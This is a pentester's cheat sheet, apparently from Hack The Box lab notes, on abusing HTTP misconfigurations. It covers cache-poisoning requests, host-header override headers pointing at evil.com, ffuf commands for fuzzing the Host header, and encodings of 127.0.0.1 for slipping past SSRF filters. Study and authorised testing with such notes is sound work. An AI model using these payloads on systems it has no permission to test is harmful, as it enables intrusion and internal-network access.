#web #cache-poisoning #host-header #ssrf

# Abusing HTTP Misconfigurations

Web cache poisoning, host-header attacks, session puzzling. Related: [http-attacks](http-attacks.md) · [server-side-attacks](server-side-attacks.md) · [ffuf](ffuf.md)

## Web Cache Poisoning
```http
GET /index.php?param1=Hello&param2=World HTTP/1.1
Host: 127.0.0.1
Content-Length: 10

param3=123
```
Fat GET: body on a GET request poisons the cache even with a keyed param.

```http
GET /?language=en&a=b;language=de HTTP/1.1
Host: 127.0.0.1
```
Parameter cloaking: cache/server parse params differently.

```bash
./wcvs -u http://simple.wcp.htb/ -gr
```
Scan for cache poisoning with WCVS (`-gr` = JSON report).

## Host Header Attacks
```http
X-Forwarded-Host: evil.com
```
Override headers to try:

| Header |
|---|
| `X-Forwarded-Host` |
| `X-Host` |
| `X-Forwarded-Server` |
| `Forwarded` |
| `X-HTTP-Host-Override` |

```bash
ffuf -u http://IP:PORT/admin.php -w ips.txt -H 'Host: FUZZ'
```
Fuzz the Host header. See [ffuf](ffuf.md).

```bash
for a in {1..255};do for b in {1..255};do echo "192.168.$a.$b" >> ips.txt; done; done
```
Build an IP wordlist for host-header fuzzing.

## localhost Blacklist Bypasses (SSRF)
Encodings of `127.0.0.1` to bypass filters. See [server-side-attacks](server-side-attacks.md).

| Form | Value |
|---|---|
| Decimal | `2130706433` |
| Hex | `0x7f000001` |
| Octal | `0177.0000.0000.0001` |
| Short form | `127.1` |
| IPv6 | `::1` |
| External domain resolving to 127.0.0.1 | `localtest.me` |

> [!TIP]
> Naive SSRF filters that blacklist the literal string `127.0.0.1` or `localhost` are often bypassed by any of the encodings above.
